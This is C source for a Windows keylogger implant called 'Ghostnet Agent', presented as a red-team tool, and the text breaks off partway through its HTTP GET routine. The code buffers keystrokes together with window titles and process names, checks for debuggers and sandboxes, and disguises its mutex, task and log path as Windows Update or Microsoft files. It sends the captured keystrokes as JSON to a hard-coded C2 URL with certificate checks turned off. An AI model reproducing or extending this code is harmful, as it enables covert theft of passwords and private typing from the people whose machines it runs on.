/*
 * Ghostnet Agent — Windows Keylogger Implant (C)
 *
 * Single-file red-team keylogger. Compile with MinGW-w64:
 *   gcc agent.c -o agent.exe -mwindows -lwinhttp -lpsapi -liphlpapi -ladvapi32
 *
 * Run: agent.exe (reads agent_config.json from same directory)
 */

/* ============================================================================
 * SECTION 1: INCLUDES & DEFINES
 * ============================================================================ */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600        /* Windows Vista+ */

#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <winsock2.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")

/* ---------- constants ---------- */

#define BUFFER_SIZE         4096
#define MAX_URL_LEN         512
#define MAX_HOST_LEN        256
#define MAX_PATH_LEN        512
#define MAX_KEY_CHAR        8
#define MAX_WINDOW_TITLE    256
#define MAX_PROCESS_NAME    64
#define MAX_BLACKLIST       32
#define MAX_BLACKLIST_STRLEN 128
#define MAX_JSON_BODY       65536
#define MAX_CONFIG_FILE     8192
#define LOG_MAX_SIZE        (1024 * 1024)
#define AGENT_ID_LEN        64
#define MAX_HEADERS_LEN     256

/* timer IDs for the hidden message window */
#define TIMER_EXFIL         1
#define TIMER_HEARTBEAT     2
#define TIMER_CONFIG_POLL   3
#define TIMER_REPAIR        4

/* persistence identifiers */
#define MUTEX_NAME          L"Local\\WindowsUpdate_8a7f3c2e"
#define TASK_NAME           L"WindowsUpdateTask"
#define REG_VALUE_NAME      "WindowsUpdate"

/* repair interval — check persistence health every 15 min */
#define REPAIR_INTERVAL_MS  (15 * 60 * 1000)

/* agent version — incremented on each release, sent in heartbeat */
#define AGENT_VERSION       "1.0.0"

/* update download buffer — max binary size we accept */
#define UPDATE_MAX_SIZE     (4 * 1024 * 1024)   /* 4 MB */

/* ---------- defines missing from some MinGW headers ---------- */

#ifndef NI_MAXHOST
#define NI_MAXHOST 1025
#endif

/* ---------- compiled-in C2 URL fallback ---------- */
/* Used when agent_config.json is not found alongside the binary.
 * Change this or set DEFAULT_C2_URL to "" to disable. */
#ifndef DEFAULT_C2_URL
#define DEFAULT_C2_URL "https://ghostnet-c2.netlify.app"
#endif

/* ---------- forward declarations ---------- */

static void c2_update(const char *url, const char *expected_sha256);
static void c2_config_poll(void);
static void persistence_paths(char *original_exe, int orig_size,
                               char *persist_dir, int dir_size,
                               char *persist_exe, int exe_size,
                               char *persist_config, int cfg_size);
static void persistence_uninstall(void);

/* ============================================================================
 * SECTION 2: DATA STRUCTURES
 * ============================================================================ */

/* a single captured keystroke event */
typedef struct {
    FILETIME timestamp;               /* UTC timestamp */
    DWORD    vk_code;
    WCHAR    character;
    char     window_title[MAX_WINDOW_TITLE];
    char     process_name[MAX_PROCESS_NAME];
    DWORD    process_id;
    DWORD    flags;
} KeyEvent;

/* ring buffer for captured keystrokes */
static KeyEvent      g_keystroke_buffer[BUFFER_SIZE];
static volatile LONG g_buffer_head  = 0;   /* next write position */
static volatile LONG g_buffer_count = 0;   /* number of pending events */
static CRITICAL_SECTION g_buffer_cs;

/* agent runtime state */
static char    g_agent_id[AGENT_ID_LEN] = {0};
static char    g_c2_url[MAX_URL_LEN]    = {0};
static int     g_c2_port                = 443;
static int     g_use_https              = 1;
static char    g_c2_host[MAX_HOST_LEN]  = {0};
static int     g_exfil_interval_sec     = 30;
static int     g_heartbeat_interval_sec = 60;
static int     g_config_poll_interval_sec = 300;
static int     g_encrypt_payload        = 0;
static int     g_agent_registered       = 0;

/* blacklist */
static char    g_blacklist[MAX_BLACKLIST][MAX_BLACKLIST_STRLEN];
static int     g_blacklist_count = 0;

/* heartbeat counter */
static volatile LONG g_keys_since_heartbeat = 0;
static DWORD   g_startup_ticks = 0;

/* ============================================================================
 * SECTION 3: LOGGING
 * ============================================================================ */

static char g_log_path[MAX_PATH] = {0};

static void log_init(void) {
    char appdata[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto", appdata);
        CreateDirectoryA(g_log_path, NULL);
        snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto\\debug.log", appdata);
    }
}

static void log_write(const char *msg) {
    if (g_log_path[0] == 0) return;

    /* rotate if too large */
    HANDLE hf = CreateFileA(g_log_path, GENERIC_READ, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(hf, NULL);
        CloseHandle(hf);
        if (sz > LOG_MAX_SIZE) {
            char old_path[MAX_PATH];
            snprintf(old_path, MAX_PATH, "%s.old", g_log_path);
            DeleteFileA(old_path);
            MoveFileA(g_log_path, old_path);
        }
    }

    hf = CreateFileA(g_log_path, FILE_APPEND_DATA, 0, NULL,
                     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME st;
    GetSystemTime(&st);
    char line[1024];
    int len = snprintf(line, sizeof(line),
                       "[%04d-%02d-%02d %02d:%02d:%02d.%03d] %s\r\n",
                       st.wYear, st.wMonth, st.wDay,
                       st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                       msg);
    DWORD written;
    WriteFile(hf, line, len, &written, NULL);
    CloseHandle(hf);
}

/* ============================================================================
 * SECTION 4: STEALTH CHECKS
 * ============================================================================ */

static int stealth_check_debugger(void) {
    if (IsDebuggerPresent()) return 1;
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    return remote ? 1 : 0;
}

static int stealth_check_sandbox(void) {
    /* RAM check — less than 2GB suggests VM/sandbox */
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return 1;

    /* Disk check — less than 60GB total suggests sandbox */
    ULARGE_INTEGER totalBytes;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL)) {
        if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) return 1;
    }

    /* CPU cores — less than 2 suggests sandbox */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;

    return 0;
}

/* ============================================================================
 * SECTION 5: UTILITY HELPERS
 * ============================================================================ */

/* case-insensitive strstr */
static const char* stristr(const char *haystack, const char *needle) {
    if (!*needle) return haystack;
    for (; *haystack; haystack++) {
        const char *h = haystack, *n = needle;
        while (*h && *n && (tolower((unsigned char)*h) == tolower((unsigned char)*n))) {
            h++; n++;
        }
        if (!*n) return haystack;
    }
    return NULL;
}

/* case-insensitive compare */
static int stricmp_local(const char *a, const char *b) {
    while (*a && *b) {
        int diff = tolower((unsigned char)*a) - tolower((unsigned char)*b);
        if (diff) return diff;
        a++; b++;
    }
    return (unsigned char)*a - (unsigned char)*b;
}

static char* str_trim(char *s) {
    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n') s++;
    char *end = s + strlen(s) - 1;
    while (end > s && (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n')) {
        *end = '\0';
        end--;
    }
    return s;
}

/*
 * Minimal JSON helpers — just enough to parse our flat config file.
 * Returns extracted value from string key.
 */
static int json_extract_string(const char *json, const char *key,
                               char *out, int out_size) {
    char search[256];
    snprintf(search, sizeof(search), "\"%s\"", key);
    int search_len = (int)strlen(search);

    /* loop to handle substring collisions (e.g. "key" matching "key_prefix") */
    const char *json_end = json + strlen(json);
    const char *scan = json;
    while (scan < json_end) {
        const char *pos = strstr(scan, search);
        if (!pos) return 0;

        /* check char after the closing quote — must be ':' or whitespace then ':' */
        const char *after_key = pos + search_len;
        while (after_key < json_end &&
               (*after_key == ' ' || *after_key == '\t' ||
                *after_key == '\r' || *after_key == '\n'))
            after_key++;
        if (after_key < json_end && *after_key == ':') {
            /* found exact match — extract the value */
            pos = after_key + 1;
            while (*pos == ' ' || *pos == '\t' || *pos == '\r' || *pos == '\n') pos++;
            if (*pos != '"') return 0;
            pos++;
            const char *end = strchr(pos, '"');
            if (!end) return 0;
            int len = (int)(end - pos);
            if (len >= out_size) len = out_size - 1;
            memcpy(out, pos, len);
            out[len] = '\0';
            return 1;
        }

        /* false match — continue search after this occurrence */
        scan = pos + 1;
    }
    return 0;
}

static int json_extract_int(const char *json, const char *key, int *out) {
    char buf[32];
    if (!json_extract_string(json, key, buf, sizeof(buf))) {
        /* try as raw number — loop to avoid substring collisions */
        char search[256];
        int search_len;
        snprintf(search, sizeof(search), "\"%s\"", key);
        search_len = (int)strlen(search);
        const char *json_end = json + strlen(json);
        const char *scan = json;
        while (scan < json_end) {
            const char *pos = strstr(scan, search);
            if (!pos) return 0;
            const char *after = pos + search_len;
            while (after < json_end &&
                   (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n'))
                after++;
            if (after < json_end && *after == ':') {
                after++;
                while (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n')
                    after++;
                *out = atoi(after);
                return 1;
            }
            scan = pos + 1;
        }
        return 0;
    }
    *out = atoi(buf);
    return 1;
}

static int json_extract_bool(const char *json, const char *key, int *out) {
    char buf[16];
    if (!json_extract_string(json, key, buf, sizeof(buf))) {
        /* try as raw literal — loop to avoid substring collisions */
        char search[256];
        int search_len;
        snprintf(search, sizeof(search), "\"%s\"", key);
        search_len = (int)strlen(search);
        const char *json_end = json + strlen(json);
        const char *scan = json;
        while (scan < json_end) {
            const char *pos = strstr(scan, search);
            if (!pos) return 0;
            const char *after = pos + search_len;
            while (after < json_end &&
                   (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n'))
                after++;
            if (after < json_end && *after == ':') {
                after++;
                while (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n')
                    after++;
                if (strncmp(after, "true", 4) == 0) { *out = 1; return 1; }
                if (strncmp(after, "false", 5) == 0) { *out = 0; return 1; }
                return 0;
            }
            scan = pos + 1;
        }
        return 0;
    }
    *out = (stricmp_local(buf, "true") == 0) ? 1 : 0;
    return 1;
}

/* extract first array entry from JSON array ["a","b"] — returns "" when done */
static const char* json_array_next(const char *json, const char *key,
                                   char *out, int out_size) {
    char search[256];
    snprintf(search, sizeof(search), "\"%s\"", key);
    const char *pos = strstr(json, search);
    if (!pos) return NULL;
    pos += strlen(search);
    while (*pos == ' ' || *pos == '\t' || *pos == '\r' || *pos == '\n') pos++;
    if (*pos != ':') return NULL;
    pos++;
    while (*pos == ' ' || *pos == '\t' || *pos == '\r' || *pos == '\n') pos++;
    if (*pos != '[') return NULL;
    return pos + 1;     /* return pointer inside array */
}

static const char* json_array_get_next(const char *arr_pos, char *out, int out_size) {
    while (*arr_pos == ' ' || *arr_pos == '\t' || *arr_pos == '\r' ||
           *arr_pos == '\n' || *arr_pos == ',') arr_pos++;
    if (*arr_pos == ']' || *arr_pos == '\0') return NULL;
    if (*arr_pos != '"') return NULL;
    arr_pos++;
    const char *end = strchr(arr_pos, '"');
    if (!end) return NULL;
    int len = (int)(end - arr_pos);
    if (len >= out_size) len = out_size - 1;
    memcpy(out, arr_pos, len);
    out[len] = '\0';
    return end + 1;
}

static int config_load(const char *filepath) {
    HANDLE hf = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        log_write("config: cannot open config file, using defaults");
        return 0;
    }

    DWORD size = GetFileSize(hf, NULL);
    if (size == INVALID_FILE_SIZE || size > MAX_CONFIG_FILE) {
        CloseHandle(hf);
        return 0;
    }

    char *buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
    if (!buf) { CloseHandle(hf); return 0; }

    DWORD read;
    ReadFile(hf, buf, size, &read, NULL);
    CloseHandle(hf);
    buf[read] = '\0';

    json_extract_string(buf, "c2_url", g_c2_url, MAX_URL_LEN);
    json_extract_int(buf, "c2_port", &g_c2_port);
    json_extract_int(buf, "check_interval_seconds", &g_exfil_interval_sec);
    json_extract_int(buf, "heartbeat_interval_seconds", &g_heartbeat_interval_sec);
    json_extract_int(buf, "config_poll_interval_seconds", &g_config_poll_interval_sec);
    json_extract_bool(buf, "encrypt_payload", &g_encrypt_payload);

    /* agent_id */
    char saved_id[AGENT_ID_LEN];
    if (json_extract_string(buf, "agent_id", saved_id, AGENT_ID_LEN)) {
        if (strcmp(saved_id, "auto") != 0) {
            strncpy(g_agent_id, saved_id, AGENT_ID_LEN - 1);
            g_agent_registered = 1;
        }
    }

    /* blacklist array */
    const char *arr = json_array_next(buf, "blacklist_windows", g_blacklist[0], MAX_BLACKLIST_STRLEN);
    if (arr && *arr) {
        g_blacklist_count = 0;
        char item[MAX_BLACKLIST_STRLEN];
        const char *p = arr;
        while (g_blacklist_count < MAX_BLACKLIST &&
               (p = json_array_get_next(p, item, MAX_BLACKLIST_STRLEN)) != NULL) {
            /* json_array_get_next advances p past the item; item was filled on entry */
            if (item[0]) {
                strncpy(g_blacklist[g_blacklist_count], item, MAX_BLACKLIST_STRLEN - 1);
                g_blacklist_count++;
            }
            if (!p || *p == ']') break;
        }
    }

    /* parse URL into host + path + scheme */
    if (g_c2_url[0]) {
        const char *url = g_c2_url;
        if (strncmp(url, "https://", 8) == 0) {
            g_use_https = 1;
            g_c2_port = (g_c2_port != 0) ? g_c2_port : 443;
            url += 8;
        } else if (strncmp(url, "http://", 7) == 0) {
            g_use_https = 0;
            g_c2_port = (g_c2_port != 0) ? g_c2_port : 80;
            url += 7;
        }

        const char *slash = strchr(url, '/');
        if (slash) {
            int host_len = (int)(slash - url);
            if (host_len >= MAX_HOST_LEN) host_len = MAX_HOST_LEN - 1;
            memcpy(g_c2_host, url, host_len);
            g_c2_host[host_len] = '\0';
        } else {
            strncpy(g_c2_host, url, MAX_HOST_LEN - 1);
        }
    }

    HeapFree(GetProcessHeap(), 0, buf);

    if (!g_c2_url[0]) {
        log_write("config: no c2_url set — agent will retry on next poll");
    }

    return 1;
}

/* Apply the compiled-in default C2 URL if no config was loaded. */
static void config_apply_default_url(void) {
    if (g_c2_url[0]) return;  /* already set from config file */

#ifdef DEFAULT_C2_URL
    strncpy(g_c2_url, DEFAULT_C2_URL, MAX_URL_LEN - 1);
    g_c2_url[MAX_URL_LEN - 1] = '\0';

    const char *url = g_c2_url;
    if (strncmp(url, "https://", 8) == 0) {
        g_use_https = 1;
        g_c2_port = (g_c2_port != 0) ? g_c2_port : 443;
        url += 8;
    } else if (strncmp(url, "http://", 7) == 0) {
        g_use_https = 0;
        g_c2_port = (g_c2_port != 0) ? g_c2_port : 80;
        url += 7;
    }

    const char *slash = strchr(url, '/');
    if (slash) {
        int host_len = (int)(slash - url);
        if (host_len >= MAX_HOST_LEN) host_len = MAX_HOST_LEN - 1;
        memcpy(g_c2_host, url, host_len);
        g_c2_host[host_len] = '\0';
    } else {
        strncpy(g_c2_host, url, MAX_HOST_LEN - 1);
    }

    log_write("config: using compiled-in default C2 URL");
#endif
}

/* update agent_config.json with the assigned agent_id */
static int config_save_agent_id(const char *filepath) {
    /* read existing config */
    HANDLE hf = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    char *buf = NULL;
    DWORD size = 0;
    if (hf != INVALID_HANDLE_VALUE) {
        size = GetFileSize(hf, NULL);
        if (size > 0 && size < MAX_CONFIG_FILE) {
            buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
            if (buf) {
                DWORD read;
                ReadFile(hf, buf, size, &read, NULL);
                buf[read] = '\0';
            }
        }
        CloseHandle(hf);
    }

    /* replace or add agent_id */
    char new_json[MAX_CONFIG_FILE];
    if (buf && strstr(buf, "\"agent_id\"")) {
        /* find and replace the value */
        const char *key_pos = strstr(buf, "\"agent_id\"");
        const char *val_start = NULL;
        const char *p = key_pos + 10;
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
        if (*p == ':') {
            p++;
            while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
            if (*p == '"') val_start = p;
        }
        if (val_start) {
            const char *val_end = strchr(val_start + 1, '"');
            if (val_end) {
                int prefix_len = (int)(val_start - buf) + 1; /* include opening quote */
                int suffix_start = (int)(val_end - buf);
                snprintf(new_json, MAX_CONFIG_FILE, "%.*s%s%s",
                         prefix_len, buf, g_agent_id, buf + suffix_start);
            } else {
                strncpy(new_json, buf, MAX_CONFIG_FILE - 1);
            }
        } else {
            strncpy(new_json, buf, MAX_CONFIG_FILE - 1);
        }
    } else if (buf) {
        /* json has no agent_id field — insert one after the opening brace */
        const char *brace = strchr(buf, '{');
        if (brace) {
            int prefix_len = (int)(brace - buf) + 1;
            snprintf(new_json, MAX_CONFIG_FILE, "%.*s\n  \"agent_id\": \"%s\",%s",
                     prefix_len, buf, g_agent_id, brace + 1);
        } else {
            snprintf(new_json, MAX_CONFIG_FILE,
                     "{\n  \"agent_id\": \"%s\"\n}", g_agent_id);
        }
    } else {
        snprintf(new_json, MAX_CONFIG_FILE,
                 "{\n  \"agent_id\": \"%s\"\n}", g_agent_id);
    }

    if (buf) HeapFree(GetProcessHeap(), 0, buf);

    hf = CreateFileA(filepath, GENERIC_WRITE, 0, NULL,
                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD written;
    WriteFile(hf, new_json, strlen(new_json), &written, NULL);
    CloseHandle(hf);
    return 1;
}

/* ============================================================================
 * SECTION 6: WINDOW CONTEXT CAPTURE
 * ============================================================================ */

static void capture_window_context(char *title, int title_size,
                                   char *process, int proc_size,
                                   DWORD *pid) {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) {
        if (title) title[0] = '\0';
        if (process) process[0] = '\0';
        if (pid) *pid = 0;
        return;
    }

    /* window title */
    if (title) {
        GetWindowTextA(hwnd, title, title_size);
        title[title_size - 1] = '\0';
    }

    /* process ID from window's thread */
    DWORD proc_id = 0;
    GetWindowThreadProcessId(hwnd, &proc_id);
    if (pid) *pid = proc_id;

    /* process name from PID */
    if (process && proc_id) {
        HANDLE hProc = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, proc_id);
        if (hProc) {
            char mod_name[MAX_PROCESS_NAME];
            DWORD mod_len = GetModuleBaseNameA(hProc, NULL, mod_name, sizeof(mod_name));
            if (mod_len > 0) {
                strncpy(process, mod_name, proc_size - 1);
                process[proc_size - 1] = '\0';
            } else {
                process[0] = '\0';
            }
            CloseHandle(hProc);
        } else {
            process[0] = '\0';
        }
    }
}

/* check if window title is blacklisted */
static int is_blacklisted(const char *window_title) {
    for (int i = 0; i < g_blacklist_count; i++) {
        if (stristr(window_title, g_blacklist[i])) {
            return 1;
        }
    }
    return 0;
}

/* check if window title is blacklisted by server-supplied list */
static int is_blacklisted_server(const char *window_title) {
    /* server blacklist is merged via config poll — already in g_blacklist */
    return is_blacklisted(window_title);
}

/* ============================================================================
 * SECTION 7: VK CODE TO CHARACTER
 * ============================================================================ */

static const char* vk_to_name(DWORD vk) {
    switch (vk) {
        case VK_RETURN:   return "[Enter]";
        case VK_TAB:      return "[Tab]";
        case VK_BACK:     return "[Backspace]";
        case VK_DELETE:   return "[Delete]";
        case VK_ESCAPE:   return "[Esc]";
        case VK_SPACE:    return " ";
        case VK_LEFT:     return "[Left]";
        case VK_RIGHT:    return "[Right]";
        case VK_UP:       return "[Up]";
        case VK_DOWN:     return "[Down]";
        case VK_HOME:     return "[Home]";
        case VK_END:      return "[End]";
        case VK_PRIOR:    return "[PgUp]";
        case VK_NEXT:     return "[PgDn]";
        case VK_INSERT:   return "[Ins]";
        case VK_CAPITAL:  return "[CapsLock]";
        case VK_NUMLOCK:  return "[NumLock]";
        case VK_SCROLL:   return "[ScrollLock]";
        case VK_SNAPSHOT: return "[PrtSc]";
        case VK_PAUSE:    return "[Pause]";
        case VK_LWIN:     return "[LWin]";
        case VK_RWIN:     return "[RWin]";
        case VK_APPS:     return "[Menu]";
        case VK_F1:  return "[F1]";  case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";  case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";  case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";  case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";  case VK_F10: return "[F10]";
        case VK_F11: return "[F11]"; case VK_F12: return "[F12]";
        default: return NULL;
    }
}

static void vk_to_utf8(DWORD vk_code, DWORD flags, char *out, int out_size) {
    const char *name = vk_to_name(vk_code);
    if (name) {
        strncpy(out, name, out_size - 1);
        out[out_size - 1] = '\0';
        return;
    }

    /* try ToUnicode for printable characters */
    BYTE key_state[256] = {0};
    /* check shift states */
    if (GetKeyState(VK_SHIFT)   & 0x8000) key_state[VK_SHIFT]   = 0x80;
    if (GetKeyState(VK_CONTROL) & 0x8000) key_state[VK_CONTROL] = 0x80;
    if (GetKeyState(VK_MENU)    & 0x8000) key_state[VK_MENU]    = 0x80;
    if (GetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;

    /* flag 0x01 = extended key; bit 16-23 = scan code */
    UINT scan_code = (flags & 0x01) ? 0xE0 : 0;
    scan_code |= ((flags >> 16) & 0xFF);

    WCHAR wchar_buf[4] = {0};
    int result = ToUnicode(vk_code, scan_code, key_state, wchar_buf, 4, 0);

    if (result > 0) {
        /* got a character — convert to UTF-8 */
        int len = WideCharToMultiByte(CP_UTF8, 0, wchar_buf, result,
                                      out, out_size - 1, NULL, NULL);
        if (len > 0) {
            out[len] = '\0';
            return;
        }
    }

    /* fallback: use VK code hex */
    snprintf(out, out_size, "[VK_%lu]", vk_code);
}

/* ============================================================================
 * SECTION 8: KEYSTROKE BUFFER
 * ============================================================================ */

static void buffer_init(void) {
    InitializeCriticalSection(&g_buffer_cs);
}

static void buffer_push(DWORD vk_code, DWORD flags,
                         const char *window_title,
                         const char *process_name,
                         DWORD process_id) {
    EnterCriticalSection(&g_buffer_cs);

    if (g_buffer_count >= BUFFER_SIZE) {
        /* buffer full — drop oldest (move head forward) */
        g_buffer_head = (g_buffer_head + 1) % BUFFER_SIZE;
        g_buffer_count--;
    }

    int idx = (g_buffer_head + g_buffer_count) % BUFFER_SIZE;
    KeyEvent *evt = &g_keystroke_buffer[idx];

    GetSystemTimeAsFileTime(&evt->timestamp);
    evt->vk_code = vk_code;
    evt->flags = flags;
    strncpy(evt->window_title, window_title ? window_title : "", MAX_WINDOW_TITLE - 1);
    evt->window_title[MAX_WINDOW_TITLE - 1] = '\0';
    strncpy(evt->process_name, process_name ? process_name : "", MAX_PROCESS_NAME - 1);
    evt->process_name[MAX_PROCESS_NAME - 1] = '\0';
    evt->process_id = process_id;

    /* translate to character */
    char key_char[MAX_KEY_CHAR];
    vk_to_utf8(vk_code, flags, key_char, sizeof(key_char));

    /* store character (we only need the first UTF-8 char for JSON) */
    evt->character = 0;
    if (key_char[0] && key_char[0] != '[') {
        /* printable single character */
        evt->character = (WCHAR)(unsigned char)key_char[0];
    }

    g_buffer_count++;
    InterlockedIncrement(&g_keys_since_heartbeat);

    LeaveCriticalSection(&g_buffer_cs);
}

static int buffer_flush(KeyEvent *out, int max_count) {
    EnterCriticalSection(&g_buffer_cs);
    int count = (int)g_buffer_count;
    if (count > max_count) count = max_count;
    int idx = g_buffer_head;

    for (int i = 0; i < count; i++) {
        out[i] = g_keystroke_buffer[idx];
        idx = (idx + 1) % BUFFER_SIZE;
    }

    g_buffer_head = (g_buffer_head + count) % BUFFER_SIZE;
    g_buffer_count -= count;

    LeaveCriticalSection(&g_buffer_cs);
    return count;
}

/* ============================================================================
 * SECTION 9: HTTP EXFILTRATION (WinHTTP)
 * ============================================================================ */

/*
 * Build a JSON batch payload from keystrokes.
 * Returns 1 if payload was built, 0 if no keystrokes to send.
 */
static int json_build_keystroke_batch(char *body, int body_size,
                                       KeyEvent *events, int event_count) {
    int pos = snprintf(body, body_size,
                       "{\"agent_id\":\"%s\",\"events\":[", g_agent_id);
    if (pos >= body_size) return 0;

    for (int i = 0; i < event_count; i++) {
        KeyEvent *evt = &events[i];

        /* format FILETIME as ISO 8601 */
        SYSTEMTIME st;
        FileTimeToSystemTime(&evt->timestamp, &st);
        char timestamp[32];
        snprintf(timestamp, sizeof(timestamp),
                 "%04d-%02d-%02dT%02d:%02d:%02d.%03dZ",
                 st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

        /* get key character as UTF-8 */
        char key_char[16];
        vk_to_utf8(evt->vk_code, evt->flags, key_char, sizeof(key_char));

        /* escape special chars in window title for JSON */
        char escaped_title[MAX_WINDOW_TITLE * 2];
        int ei = 0;
        for (int c = 0; evt->window_title[c] && ei < (int)sizeof(escaped_title) - 2; c++) {
            char ch = evt->window_title[c];
            if (ch == '"')  { escaped_title[ei++] = '\\'; escaped_title[ei++] = '"'; }
            else if (ch == '\\') { escaped_title[ei++] = '\\'; escaped_title[ei++] = '\\'; }
            else if (ch == '\n') { escaped_title[ei++] = '\\'; escaped_title[ei++] = 'n'; }
            else if (ch == '\r') { escaped_title[ei++] = '\\'; escaped_title[ei++] = 'r'; }
            else if (ch == '\t') { escaped_title[ei++] = '\\'; escaped_title[ei++] = 't'; }
            else { escaped_title[ei++] = ch; }
        }
        escaped_title[ei] = '\0';

        int n = snprintf(body + pos, body_size - pos,
                          "%s{\"timestamp_utc\":\"%s\","
                          "\"window_title\":\"%s\","
                          "\"process_name\":\"%s\","
                          "\"key_char\":\"%s\","
                          "\"vk_code\":%lu,\"flags\":%lu}",
                          (i > 0) ? "," : "",
                          timestamp,
                          escaped_title,
                          evt->process_name,
                          key_char,
                          evt->vk_code,
                          (unsigned long)evt->flags);
        if (n < 0 || pos + n >= body_size) break;
        pos += n;
    }

    int n = snprintf(body + pos, body_size - pos, "]}");
    if (n < 0 || pos + n >= body_size) return 0;
    pos += n;
    return 1;
}

static int http_post(const char *path, const char *body, char *response, int resp_size) {
    if (!g_c2_host[0]) return -1;

    WCHAR whost[MAX_HOST_LEN];
    WCHAR wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, g_c2_host, -1, whost, MAX_HOST_LEN);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);

    HINTERNET hSession = WinHttpOpen(
        L"Ghostnet-Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = WinHttpConnect(hSession, whost,
                                        (INTERNET_PORT)g_c2_port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }

    DWORD flags = g_use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"POST", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return -1;
    }

    /* allow self-signed certs in testing */
    if (g_use_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &sec_flags, sizeof(sec_flags));
    }

    /* set headers */
    WCHAR wheaders[] = L"Content-Type: application/json\r\n";
    BOOL ok = WinHttpSendRequest(
        hRequest, wheaders, (DWORD)-1,
        (LPVOID)body, (DWORD)strlen(body), (DWORD)strlen(body), 0);

    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok && response && resp_size > 0) {
        DWORD avail, read;
        int total = 0;
        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            DWORD to_read = avail;
            if (total + (int)to_read >= resp_size) to_read = resp_size - total - 1;
            if (WinHttpReadData(hRequest, response + total, to_read, &read)) {
                total += read;
                response[total] = '\0';
            } else {
                break;
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (ok && response) ? (int)strlen(response) : (ok ? 0 : -1);
}

static int http_get(const char *path, char *response, int resp_size) {
    if (!g_c2_host[0]) return -1;

    WCHAR whost[MAX_HOST_LEN];
    WCHAR wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, g_c2_host, -1, whost, MAX_HOST_LEN);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);

    HINTERNET hSession = WinHttpOpen(
        L"Ghostnet-Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = WinHttpConnect(hSession, whost,
                                        (INTERNET_PORT)g_c2_port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }

